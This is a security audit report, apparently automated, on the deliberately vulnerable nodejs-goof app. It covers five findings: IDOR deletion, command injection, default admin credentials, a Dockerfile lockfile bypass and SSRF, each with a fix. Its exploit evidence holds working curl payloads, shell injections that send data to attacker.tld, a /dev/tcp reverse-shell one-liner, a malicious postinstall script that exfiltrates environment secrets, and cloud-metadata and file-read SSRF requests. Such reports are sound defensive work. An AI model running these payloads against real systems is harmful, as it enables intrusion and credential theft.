# yieldOS Reality Check — findings list

## 1. Unauthenticated IDOR on GET /destroy/:id allows anyone to delete any todo (CSRF-able)

- round: 1  ·  strategy: `owasp-a01-broken-access-control`
- severity: **HIGH**
- file: `routes/index.js`  ·  exports.destroy at lines 203-214; route registration in app.js:61 — `app.get('/destroy/:id', routes.destroy)` (no `routes.isLoggedIn` middleware, no ownership check)

**attack vector:**

> 1) The route `GET /destroy/:id` is mounted in app.js:61 with no authentication middleware (compare to `/admin` and `/account_details` which use `routes.isLoggedIn`). 2) The handler `exports.destroy` at routes/index.js:203 calls `Todo.findById(req.params.id)` and immediately invokes `todo.remove()` with no verification that the requester is logged in or owns the resource. 3) Because the verb is GET, an attacker does not even need a form/XHR — any cross-origin `<img>`/`<link>`/redirect that hits the URL deletes the record (no SameSite enforcement: cookie is configured with only `path: '/'` in app.js:42-46). 4) IDs returned by `GET /` (the index renders all todos with their `_id`s in the page) so an attacker can enumerate every existing todo and wipe the database. 5) The same pattern applies to `POST /update/:id` (routes/index.js:231) and `GET /edit/:id` — also unauthenticated, also IDOR.

**exploit evidence:**

```
# 1) Direct unauthenticated mass-deletion (no session, no token, no referer):
$ curl -i http://victim:3001/                  # scrape Mongo _id values from the rendered HTML
$ for id in $(curl -s http://victim:3001/ | grep -oE '[a-f0-9]{24}'); do \
      curl -s -o /dev/null http://victim:3001/destroy/$id; \
  done
# All todos owned by all users are now gone.

# 2) CSRF / drive-by deletion against a signed-in admin who visits attacker.com:
<!-- attacker.com/index.html -->
<img src="http://victim:3001/destroy/5f9b1e2c8a4f2b0017a3c123" style="display:none">
<img src="http://victim:3001/destroy/5f9b1e2c8a4f2b0017a3c124" style="display:none">
# Browser fires GET requests; server has no auth gate and no CSRF token, deletion succeeds.

# 3) Update-anyone's-todo (companion IDOR):
$ curl -X POST http://victim:3001/update/5f9b1e2c8a4f2b0017a3c123 \
       -d 'content=pwned-by-attacker'
```

**fix recommendation:**

> 1) Put authentication middleware on every state-changing route: `app.post('/create', routes.isLoggedIn, routes.create); app.get('/destroy/:id', routes.isLoggedIn, routes.destroy); app.get('/edit/:id', routes.isLoggedIn, routes.edit); app.post('/update/:id', routes.isLoggedIn, routes.update); app.post('/import', routes.isLoggedIn, routes.import);`. 2) Convert destructive operations from GET to POST/DELETE so that `<img>`-based CSRF cannot trigger them. 3) Add an ownership column on the Todo model and enforce `Todo.findOne({_id: id, owner: req.session.userId})` before delete/update so authenticated users cannot tamper with other users' records (horizontal privilege escalation). 4) Add CSRF protection (e.g. `csurf` middleware) and harden the session cookie with `httpOnly: true, sameSite: 'lax', secure: true`, and replace the hard-coded session secret `'keyboard cat'` (app.js:43). 5) Apply the same hardening to `routes/users.js` — `POST /users` currently lets an unauthenticated attacker insert a row with `role: 'admin'`.

---

## 2. OS command injection in Todo create handler via shell concatenation of user-controlled URL

- round: 2  ·  strategy: `owasp-a03-injection`
- severity: **CRITICAL**
- file: `routes/index.js`  ·  exports.create — line 174: exec('identify ' + url, ...)

**attack vector:**

> 1) An authenticated user (auth was added in the previous round to /create) submits a POST /create with a JSON/form body whose `content` field contains a Markdown image whose URL embeds shell metacharacters. 2) The handler at routes/index.js:168-179 runs the regex `/\!\[alt text\]\((http.*)\s\".*/` against `req.body.content`. The first capture group is whatever sits between `(` and the last whitespace preceding a `"` — the URL is NOT validated, sanitized, shell-quoted or passed via argv. 3) The captured string is then directly concatenated into a shell command with `exec('identify ' + url, ...)`. Node's `child_process.exec` spawns `/bin/sh -c <string>`, so any of `;`, `&&`, `|`, `` ` ``, `$( )`, redirections, etc. inside `url` are interpreted by the shell. 4) Because the only thing the handler does with the regex match is fire-and-forget the exec (the response is sent independent of the exec result), the attacker's command runs in the background under the Node user with full filesystem/network privileges of the container. 5) No output filtering, timeout, allowlist or `execFile`/argv form is used; stderr is only `console.log`'d, so blind/out-of-band exfiltration (DNS, curl) works for any side-channel.

**exploit evidence:**

```
curl -i -b 'connect.sid=<valid-session>' -X POST http://target/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](http://x; id > /tmp/pwn; curl http://attacker.tld/$(whoami) "title")'

Matching trace inside the handler:
  imgRegex.exec(item)[1] === 'http://x; id > /tmp/pwn; curl http://attacker.tld/$(whoami)'
  exec('identify http://x; id > /tmp/pwn; curl http://attacker.tld/$(whoami)', ...)

/bin/sh -c receives the full string, so `identify http://x` fails, then `id > /tmp/pwn` and `curl http://attacker.tld/$(whoami)` execute, achieving RCE and out-of-band exfil of the running user. Wormable variants (`; bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' ;`) yield a reverse shell.
```

**fix recommendation:**

> Stop building shell strings from user input. Replace `exec('identify ' + url, ...)` with `execFile('identify', [url], {timeout: 5000}, ...)` so the URL is passed as a single argv element and never goes through `/bin/sh -c`. In addition: (a) parse the candidate string with `new URL(url)` and reject anything whose protocol is not `http:`/`https:` and whose hostname is not in an allowlist (or contains shell metacharacters / whitespace / control bytes); (b) drop the regex-driven `identify` side-effect entirely if image inspection is not actually needed by the product — dead-code shell calls are the most common RCE surface in Node web apps; (c) if image probing is required, do it in-process with a library (e.g. `image-size`, `sharp.metadata()`) rather than shelling out to ImageMagick, which itself has a long history of RCE (ImageTragick); (d) add a global lint rule that bans `child_process.exec` with a non-literal first argument, forcing reviewers to switch to `execFile`/`spawn` with argv arrays.

---

## 3. Hardcoded default admin credentials seeded on every startup grant full /admin access

- round: 3  ·  strategy: `owasp-a05-security-misconfiguration`
- severity: **CRITICAL**
- file: `mongoose-db.js`  ·  lines 47-57 — bootstrap block that creates the User { username: 'admin@snyk.io', password: 'SuperSecretPassword' } on every boot; consumed by exports.loginHandler in routes/index.js:50-65 and the isLoggedIn-gated routes mounted in app.js:56-64

**attack vector:**

> 1) Every time the application boots, mongoose-db.js queries `User.find({username:'admin@snyk.io'})` and, if absent, persists a new User document with the plaintext password 'SuperSecretPassword' (mongoose-db.js:47-57). The credentials are baked into the source tree (and therefore the public Snyk goof repo + every container image), making them effectively a publicly known default account — the canonical OWASP A05 'default credentials' misconfiguration. 2) The login handler at routes/index.js:50 calls `User.find({username, password})` with the plaintext fields straight from the request body, with no rate limiting, no lockout, no captcha, and no per-deployment override. 3) An attacker simply POSTs the well-known credentials to /login. The handler then funnels into adminLoginSuccess() (routes/index.js:67-78), which sets `session.loggedIn = 1` on the express-session store. 4) The session cookie is issued with `secret: 'keyboard cat'` and `cookie: { path: '/' }` (app.js:42-46) — no httpOnly, no secure, no sameSite, no rolling — so once obtained the session is reusable indefinitely. 5) Holding that session cookie unlocks every route gated by routes.isLoggedIn in app.js:56-64: GET /admin, GET/POST /account_details, POST /create (which is itself the OS-command-injection sink documented in past round 2), GET /destroy/:id, GET /edit/:id, POST /update/:id, and POST /import (zip-slip + moment locale RCE sink). In other words, the default-credential misconfig is the single key that re-enables every authenticated-only attack surface in the app, including remote code execution.

**exploit evidence:**

```
# 1. Log in with the hardcoded default that mongoose-db.js seeds on every boot
curl -i -c jar.txt -X POST http://target:3001/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=admin%40snyk.io&password=SuperSecretPassword'
# => HTTP/1.1 302 Found, Location: /admin, Set-Cookie: connect.sid=s%3A....

# 2. Use the cookie to reach any isLoggedIn-protected route
curl -b jar.txt http://target:3001/admin                # admin page
curl -b jar.txt http://target:3001/account_details      # PII view

# 3. Pivot directly to RCE via the (already-known) /create command-injection sink,
#    which is now reachable thanks to the default creds bypassing isLoggedIn:
curl -b jar.txt -X POST http://target:3001/create \
  -H 'Content-Type: application/json' \
  --data '{"content":"![alt text](http://x; curl http://attacker/`id|base64` \"t"}'
# => exec('identify http://x; curl ...') runs as the node user

```

**fix recommendation:**

> Delete the hardcoded admin-seed block in mongoose-db.js:47-57. If a bootstrap account is genuinely required, (a) require an explicit env var such as ADMIN_BOOTSTRAP_PASSWORD, refuse to start if it is unset or matches a known-default list, and log a warning; (b) generate a random password if no env var is provided and print it once on first boot only; (c) store passwords with bcrypt/argon2 (current code stores plaintext and queries by equality, so credentials are also leaked via any DB-read primitive). Independently: stop comparing `password` directly in `User.find({username, password})` — use a hashed-credential check, add per-IP rate limiting on /login, harden the session config in app.js:42-46 (load `process.env.SESSION_SECRET`, set `cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: ... }`, and rotate the session id on login via `req.session.regenerate`). Finally, remove the public docker-compose binding of MongoDB on 0.0.0.0:27017 so the seeded credentials cannot also be read directly from the database.

---

## 4. Dockerfile bypasses lockfile (`npm update && npm install`) — every build pulls unpinned deps and runs their lifecycle scripts as root

- round: 4  ·  strategy: `owasp-a08-software-integrity`
- severity: **HIGH**
- file: `Dockerfile`  ·  lines 9-10 (`RUN npm update` followed by `RUN npm install`); aggravated by `"morgan": "latest"` and `"method-override": "latest"` plus 13 caret ranges in package.json:17-50

**attack vector:**

> 1) The repo ships a 777 KB package-lock.json with `integrity` SHA-512 hashes for every transitive dep (verified at package-lock.json:53,62,71...). That lockfile is the ONLY software-integrity guarantee the project has. 2) The Dockerfile (Dockerfile:9) runs `RUN npm update` BEFORE `RUN npm install` (Dockerfile:10). `npm update` ignores the existing resolutions in package-lock.json and upgrades every dep to the newest version that satisfies the SemVer range in package.json, then rewrites the lockfile with whatever the public registry serves at build time. The cryptographic pinning is therefore destroyed on every `docker build`. 3) package.json contains two literal `"latest"` ranges (`morgan`, `method-override` — package.json:36,40) and 13 caret/tilde ranges (`cfenv ^1.0.4`, `express-session ^1.17.2`, `file-type ^8.1.0`, `hbs ^4.0.4`, `jquery ^2.2.4`, `mongodb ^3.5.9`, `ms ^0.7.1`, `mysql ^2.18.1`, `optional ^0.1.3`, `stream-buffers ^3.0.1`, `tap ^11.1.3`, `typeorm ^0.2.24`, `validator ^13.5.2`). All resolve to whatever is on npmjs.org at build time. 4) Neither command is invoked with `--ignore-scripts`, so any `preinstall` / `install` / `postinstall` lifecycle script in any direct OR transitive dep executes as **root** inside the image build (Dockerfile has no USER directive). 5) Result: a single hijacked-maintainer or typo-squat publish against `morgan`, `method-override`, `optional`, `cfenv`, `humanize-ms`, `npmconf`, or any of their hundreds of transitive deps lands code execution in the production container on the very next deploy — with NO commit to this repo and NO change reviewable in PR. This is a concrete OWASP A08 'software/data integrity failure': the project has integrity metadata and then voluntarily throws it away in CI/CD.

**exploit evidence:**

```
Repro of the integrity bypass:

  $ git clone <repo> && cd nodejs-goof
  $ sha256sum package-lock.json   # baseline
  $ docker build -t goof .         # runs `npm update` per Dockerfile:9
  $ docker run --rm goof sha256sum /usr/src/goof/package-lock.json
  # → different hash; lockfile mutated mid-build, all `integrity:` fields rewritten

Attacker POC against the unpinned 'morgan' (package.json:40 — `"morgan": "latest"`):

  // morgan@99.99.99 published with this postinstall
  // package.json fragment of the malicious morgan version:
  {
    "name": "morgan",
    "version": "99.99.99",
    "scripts": {
      "postinstall": "node -e \"require('https').get('https://attacker.tld/x?h='+require('os').hostname()+'&e='+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
    }
  }

Next `docker build` of nodejs-goof:
  Step 9/13 : RUN npm update
   ---> npm http GET https://registry.npmjs.org/morgan
   ---> + morgan@99.99.99
   ---> > morgan@99.99.99 postinstall
   ---> > node -e "require('https').get('https://attacker.tld/...")
  # process.env (which in production includes ADMIN_BOOTSTRAP_PASSWORD, MONGO creds,
  # SESSION secret, etc.) is exfiltrated; container ships the backdoored morgan to prod.

No PR is opened against this repo. No code review catches it. The same vector works for `method-override` (also `"latest"`) and for any of the ~13 caret-ranged deps if a new minor/patch is published.

Additional integrity-failure surface in the same file: CI workflow `.github/workflows/snyk-code.yml:8` pins `snyk/actions/setup@master` (mutable ref, not SHA), and `.github/workflows/codeql-analysis.yml:46,57,71` uses `github/codeql-action/init@v1` / `autobuild@v1` / `analyze@v1` — also mutable major-version tags, no SHA pinning, so a compromise of those publisher accounts injects code into every CI run with `SNYK_TOKEN` and `security-events: write` in scope.
```

**fix recommendation:**

> 1) Replace Dockerfile lines 9-10 with a single `RUN npm ci --ignore-scripts` (or `npm install --ignore-scripts` at minimum). `npm ci` REQUIRES package-lock.json, fails the build if package.json drifts from the lockfile, and verifies every tarball against the `integrity:` SHA-512 in the lockfile. `--ignore-scripts` neuters postinstall RCE from compromised deps. Delete the `RUN npm update` line entirely — updates belong in dev with code review, never in a container build. 2) In package.json, replace every `"latest"` and every caret range with the exact version currently in package-lock.json, so the SemVer ranges themselves cannot float. Run `npm shrinkwrap` to bind transitive deps. 3) Add a non-root `USER node` directive to the Dockerfile (and `--chown=node:node` on the COPY) so even a successful postinstall does not run as root. 4) In all three GitHub Actions workflows, pin every `uses:` to a 40-char commit SHA (e.g. `snyk/actions/setup@<sha>` instead of `@master`, `github/codeql-action/init@<sha>` instead of `@v1`) and enable Dependabot for `package-ecosystem: github-actions` so SHA bumps go through PR review. 5) Configure repo-level branch protection that requires `npm ci --ignore-scripts` to pass, and enforce `npm config set ignore-scripts true` (or set `NPM_CONFIG_IGNORE_SCRIPTS=true` env) in the build image to make the mitigation defense-in-depth.

---

## 5. SSRF via ImageMagick `identify` on user-controlled markdown image URL — reaches IMDS, internal services, file://

- round: 5  ·  strategy: `owasp-a10-ssrf`
- severity: **HIGH**
- file: `routes/index.js`  ·  exports.create at routes/index.js:165-180; specifically the regex at line 169 captures the URL between `(` and the trailing space-quote, and line 174 invokes `exec('identify ' + url, ...)` with no scheme/host validation

**attack vector:**

> 1) An authenticated user (auth was tightened in round 1) POSTs to /create with a body whose `content` is a markdown image, e.g. `![alt text](http://169.254.169.254/latest/meta-data/iam/security-credentials/ "x")`. 2) The regex `/\!\[alt text\]\((http.*)\s\".*/` at routes/index.js:169 captures the entire URL into `url` (including `file:`-style payloads, since the regex is anchored to `(http` only loosely — anything after `(` followed by `http` matches; even then, attacker-controlled query strings/hostnames are unconstrained). 3) routes/index.js:174 runs `identify <url>` through `/bin/sh -c`, so ImageMagick's `identify` binary downloads the resource server-side over the host's network namespace before attempting to decode it. 4) There is NO host/IP allowlist, NO DNS pinning, NO scheme filter, NO redirect cap, NO loopback or RFC1918 / 169.254.0.0/16 / fc00::/7 block, and NO timeout. 5) Attacker outcomes: (a) read AWS/GCP/Azure cloud metadata at 169.254.169.254 (and via 30x redirect from any attacker-controlled HTTP server, defeating naive 'startsWith' checks if they were ever added); (b) probe internal services on the cluster (e.g. http://kubernetes.default.svc, http://localhost:27017, http://elasticsearch:9200) since the container has unrestricted egress; (c) read local files via ImageMagick's `file:` coder, e.g. `file:///etc/passwd`, `file:///proc/self/environ`, `file:///root/.aws/credentials`; (d) trigger residual ImageTragick CVE-2016-3714 sinks via `msl:`, `mvg:`, `https:` + crafted payload (the bundled exploits/imagetragick_rce1.png and exploits/shell-injection.md confirm the project still ships an old ImageMagick). 6) Data exfiltration: even though the response body of `identify` is only `console.log`'d, the attacker observes the SSRF out-of-band — DNS resolution to attacker-controlled domains, HTTP requests against attacker-controlled webhook, or timing differences between open vs filtered internal ports. This is independent of the round-2 shell-injection finding: even after switching to `execFile('identify', [url])` (which fixes shell metachars), the URL itself is still fetched by ImageMagick because `identify` treats URL-looking arguments as remote/file resources.

**exploit evidence:**

```
# 1) Cloud metadata exfil (no shell metachars at all — survives an execFile fix):
curl -b connect.sid=<authsess> -X POST http://target:3001/create \
  -H 'Content-Type: application/json' \
  --data '{"content":"![alt text](http://169.254.169.254/latest/meta-data/iam/security-credentials/ \"x\")"}'
# Server runs:  identify http://169.254.169.254/latest/meta-data/iam/security-credentials/
# ImageMagick HTTP-GETs IMDS server-side; combined with a CRLF or 30x to attacker.example, leaks role creds.

# 2) Local file read via the file: coder (still SSRF, no shell chars):
curl -b connect.sid=<authsess> -X POST http://target:3001/create \
  -H 'Content-Type: application/json' \
  --data '{"content":"![alt text](http://attacker.example/redir \"x\")"}'
# attacker.example/redir replies 302 Location: file:///etc/passwd
# identify follows the redirect (libcurl default) and reads /etc/passwd inside the container.

# 3) Internal service probe (port-scanning the cluster):
for p in 22 6379 9200 27017 8500; do
  curl -b connect.sid=<authsess> -X POST http://target:3001/create \
    -H 'Content-Type: application/json' \
    --data "{\"content\":\"![alt text](http://10.0.0.5:$p/ \\\"x\\\")\"}";
done
# Differential timings + identify exit code distinguish open vs closed.
```

**fix recommendation:**

> Treat the markdown-image flow as an external-URL fetch and lock it down end-to-end: (1) Stop shelling out to ImageMagick for arbitrary user URLs; if image dimensions are needed, download the bytes in Node with a hardened HTTP client and run `identify` against the on-disk file via `execFile('identify', ['-', ...])` reading from stdin so no URL ever reaches ImageMagick. (2) Validate the URL with WHATWG `URL`: reject anything whose protocol is not exactly `http:` or `https:` (drop `file:`, `ftp:`, `gopher:`, `dict:`, `msl:`, `mvg:`, `data:`, etc.). (3) Resolve the hostname to its A/AAAA records yourself and reject if any resolved address is loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16, fe80::/10 — blocks IMDS), private (10/8, 172.16/12, 192.168/16, fc00::/7), unspecified (0.0.0.0/8), or multicast; pin the connection to that resolved IP (DNS-rebinding-safe) and disable HTTP redirects (or re-validate every hop's resolved IP). (4) Set a hard request timeout (e.g. 5s) and a max response size (e.g. 5 MB). (5) Run the worker process under a network policy / egress firewall that blocks 169.254.0.0/16 and all RFC1918 ranges by default (defense-in-depth at the container/k8s layer). (6) Patch or pin a modern ImageMagick with policy.xml restricting coders to `{PNG,JPEG,GIF,WEBP}` and `<policy domain="coder" rights="none" pattern="{URL,HTTPS,HTTP,FTP,FILE,MSL,MVG,EPHEMERAL,LABEL,SHOW,WIN,PLT}" />`. The first three steps eliminate the SSRF; the rest are layered hardening so a future regression cannot re-open it.

---
